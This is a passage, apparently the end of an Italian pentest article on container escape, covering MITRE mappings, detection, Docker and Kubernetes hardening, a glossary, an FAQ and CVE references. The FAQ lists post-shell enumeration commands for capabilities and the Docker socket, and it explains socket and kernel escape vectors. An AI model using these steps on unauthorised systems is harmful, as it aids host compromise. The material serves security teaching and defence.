Alcune tecniche descritte in questo articolo hanno un mapping diretto nel framework MITRE ATT\&CK, utile per la reportistica:

* **Escape to Host (T1611)** — copre direttamente le tecniche di fuga da container verso host
* **Exploitation for Privilege Escalation (T1068)** — kernel exploit e sfruttamento di vulnerabilità software
* **Valid Accounts (T1078)** — riuso di credenziali trovate in variabili d'ambiente o secret
* **Unsecured Credentials: Cloud Instance Metadata API (T1552.005)** — furto credenziali via IMDS

## Detection & Difesa (Blue Team)

* **Falco / Sysdig** — rilevano mount anomali, invocazioni di `nsenter`, accessi sospetti a `/proc`, uso di capability privilegiate a runtime
* **Kubernetes audit log** — traccia creazione di pod privilegiati, accessi ai secret, comandi `exec` in pod
* **EDR container-aware** — soluzioni come Aqua Security o Prisma Cloud monitorano comportamento a livello container, non solo host

## Come Prevenire un Container Escape

**Docker**

* evitare `--privileged` in produzione
* non montare mai il Docker socket dentro un container applicativo
* drop di tutte le capability, aggiungendo solo quelle strettamente necessarie (`--cap-drop=ALL --cap-add=...`)
* profili seccomp e AppArmor/SELinux attivi
* rootless containers dove possibile
* filesystem read-only per il container
* evitare device passthrough non necessari

**Kubernetes**

* Pod Security Standards in modalità `restricted`
* RBAC a privilegio minimo per ogni service account
* evitare `hostPID`, `hostNetwork`, `hostPath` salvo necessità reale
* vietare pod privilegiati a livello di policy
* NetworkPolicies per limitare la comunicazione tra pod
* audit logging attivo sull'API server

**Host**

* kernel aggiornato con le patch di sicurezza più recenti
* runtime container aggiornato (Docker/containerd/CRI-O)
* IMDSv2 enforced su istanze cloud, per ridurre il rischio di accesso alle credenziali IMDS tramite SSRF (non è una protezione universale contro ogni tipo di SSRF)
* monitoring runtime (Falco, gVisor/Kata Containers per isolamento kernel più forte)

## Glossario

| Termine           | Significato                                                                             |
| ----------------- | --------------------------------------------------------------------------------------- |
| Container         | Ambiente isolato a livello di sistema operativo, non di hardware                        |
| Container runtime | Software che esegue i container (Docker, containerd, CRI-O)                             |
| Namespace         | Meccanismo del kernel Linux che isola risorse (PID, rete, mount, ecc.)                  |
| cgroup            | Meccanismo del kernel per limitare e contabilizzare le risorse di un gruppo di processi |
| Capability        | Privilegio Linux granulare, sottoinsieme dei poteri di root                             |
| Docker socket     | Interfaccia Unix su cui ascolta il Docker daemon                                        |
| Pod               | Unità deployabile minima in Kubernetes, uno o più container                             |
| Kubelet           | Agente Kubernetes che gira su ogni nodo e gestisce i pod locali                         |
| IMDS              | Instance Metadata Service, servizio cloud che espone credenziali/dati dell'istanza      |

## FAQ

**Cos'è un container escape?**
È la tecnica con cui un attaccante esce dall'isolamento di un container per raggiungere l'host o il runtime sottostante, sfruttando misconfigurazioni o vulnerabilità del kernel condiviso.

**Quali sono i primi comandi da eseguire dopo aver ottenuto una shell in un container?**
`id` e `cat /proc/1/cgroup` per confermare di essere in un container, `grep Cap /proc/self/status` o `capsh --print` per le capability, `ls -la /var/run/docker.sock` per il socket, `mount` per i mount point sospetti, `ip addr` per il network namespace. La [Quick Reference](#container-escape-quick-reference) di questo articolo riassume cosa controllare per ciascun finding.

**Come verificare se un container è privilegiato?**
`cat /proc/self/status | grep CapEff` — se il valore è vicino a `ffffffffff` (praticamente tutte le capability attive), il container è quasi certamente `--privileged`.

**Come verificare se il Docker socket è esposto?**
`ls -la /var/run/docker.sock` — se il file esiste ed è accessibile in lettura/scrittura dall'utente corrente nel container, il socket è utilizzabile per controllare il Docker daemon.

**Come verificare le capabilities di un container?**
`capsh --print 2>/dev/null | grep -E "cap_sys_admin|cap_sys_ptrace|cap_dac_read_search|cap_net_admin|cap_sys_module"` fa una scansione mirata sulle capability rilevanti per un escape in un solo comando, invece di controllarle una per una.

**`--privileged` equivale a root sull'host?**
No, non è tecnicamente identico. Rimuove gran parte delle restrizioni di isolamento e rende la compromissione dell'host molto probabile in presenza di ulteriori condizioni (device esposti, cgroup v1, namespace condivisi), ma non è di per sé un accesso diretto al filesystem o ai processi host.

**Il Docker socket montato permette il container escape?**
Può permetterlo. Se il socket è raggiungibile e l'attaccante può interagire con il Docker daemon, può usarlo per creare un container con accesso al filesystem dell'host tramite bind mount. L'impatto esatto dipende dai permessi sul socket e dalla configurazione del daemon.

**Qual è la differenza tra container escape e privilege escalation?**
La privilege escalation ottiene privilegi maggiori restando nello stesso ambiente (es. da utente a root, ma sempre dentro il container). Il container escape supera invece i confini di isolamento del container stesso, raggiungendo l'host o il runtime sottostante — sono passi distinti, anche se spesso concatenati nello stesso attacco.

**Qual è il vettore di container escape più comune in pratica?**
Nei pentest reali, container privilegiati e Docker socket montati sono tra i vettori riscontrati più frequentemente, perché derivano da scelte di configurazione esplicite (spesso per comodità operativa) piuttosto che da vulnerabilità software da scoprire.

**Un container Docker non privilegiato è sicuro da container escape?**
Riduce sensibilmente la superficie d'attacco rispetto a `--privileged`, ma non elimina il rischio: capability specifiche assegnate manualmente, un Docker socket montato per errore, o una vulnerabilità del kernel condiviso restano vettori validi anche senza modalità privilegiata.

**Quali Linux capability sono le più pericolose?**
`CAP_SYS_ADMIN` e `CAP_SYS_MODULE` sono le più critiche perché aprono direttamente a mount arbitrari o caricamento di codice kernel. `CAP_SYS_PTRACE` e `CAP_NET_ADMIN` sono pericolose solo se combinate con namespace condivisi.

**È possibile fare container escape da Kubernetes?**
Sì, ma i vettori aggiuntivi (RBAC, service account, kubelet, etcd) vanno considerati separatamente da un semplice escape Docker: un pod compromesso non implica automaticamente accesso al nodo o al cluster.

**Come si previene un container escape?**
Evitando `--privileged` e il mount del Docker socket, applicando il principio del minimo privilegio sulle capability e sul RBAC Kubernetes, e mantenendo kernel e runtime aggiornati.

**Quali vulnerabilità del kernel permettono un container escape?**
CVE come Dirty Pipe (CVE-2022-0847) o la heap overflow di CVE-2022-0185 sono esempi noti, ma l'exploitability reale dipende dalla versione esatta del kernel e dalla configurazione di sicurezza del container.

**Le vulnerabilità del container runtime sono diverse da quelle del kernel?**
Sì. Il kernel è condiviso a livello di sistema operativo; runc e containerd sono invece il software che avvia i container sopra quel kernel. CVE come CVE-2024-21626 ("Leaky Vessels") sfruttano un difetto nel runtime stesso, non nel kernel, e spesso funzionano anche senza `--privileged` o capability particolari — per questo il patching del runtime va trattato con la stessa priorità di quello del kernel.

## Conclusioni

Il container escape non è un singolo exploit ma una famiglia di tecniche che sfruttano il fatto che l'isolamento dei container è costruito su primitive del kernel Linux, non su virtualizzazione hardware. In un pentest cloud-native, ogni shell ottenuta dentro un container va valutata sistematicamente contro la checklist di questo articolo, prima di assumere di essere "bloccati" al confine del container.

**Da ricordare:**

1. Un container compromesso non significa automaticamente host compromise.
2. Container privilegiati, Docker socket montati e host mount sono i vettori più critici e più comuni in pratica.
3. Le capability vanno sempre verificate singolarmente: non tutte quelle "pericolose" portano a escape senza condizioni aggiuntive.
4. Kubernetes aggiunge una superficie propria — RBAC, service account, kubelet, etcd — distinta dal semplice escape da container.
5. Il kernel condiviso resta una componente fondamentale della superficie d'attacco, sia per `CAP_SYS_MODULE` che per exploit diretti.

## Articoli Correlati

* [RCE](https://hackita.it/articoli/rce/) — come si arriva a una shell nel container in primo luogo
* [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc/) — la fase successiva/precedente rispetto al container escape
* [Docker Security](https://hackita.it/articoli/docker-security/) — hardening e configurazione sicura di Docker
* [Kubernetes Security](https://hackita.it/articoli/kubernetes-security-exploitation/) — exploitation e difesa specifiche per cluster K8s
* [Porta 2375 Docker API](https://hackita.it/articoli/porta-2375-docker-api/) — stesso vettore del Docker socket, esposto via rete
* [SSRF](https://hackita.it/articoli/ssrf/) — vettore comune per raggiungere il cloud metadata service
* [AWS Security](https://hackita.it/articoli/aws-security/) — privilege escalation con le credenziali ottenute via IMDS
* [Cloud Security Automation](https://hackita.it/articoli/cloud-security-automation/) — automatizzare l'auditing di ambienti cloud-native

## Fonti e riferimenti

**Documentazione ufficiale**

* [Docker Engine Security](https://docs.docker.com/engine/security/)
* [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)
* [AWS IMDS — Instance Metadata Service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
* [GCP Metadata Server](https://cloud.google.com/compute/docs/metadata/overview)
* [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
* [Linux Capabilities — man7.org](https://man7.org/linux/man-pages/man7/capabilities.7.html)

**Security research**

* [CVE-2022-0847 — Dirty Pipe (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2022-0847)
* [CVE-2022-0185 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2022-0185)
* [CVE-2021-22555 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2021-22555)
* [CVE-2020-14386 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2020-14386)
* [CVE-2024-1086 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2024-1086)
* [CVE-2019-5736 — runc (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)
* [CVE-2024-21626 — "Leaky Vessels" (Snyk Labs)](https://labs.snyk.io/resources/leaky-vessels-docker-runc-container-breakout-vulnerabilities/)
* [CVE-2024-21626 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2024-21626)
* [MITRE ATT\&CK — Escape to Host (T1611)](https://attack.mitre.org/techniques/T1611/)
* [HackTricks — Docker Security](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)

Uso esclusivo in ambienti autorizzati.
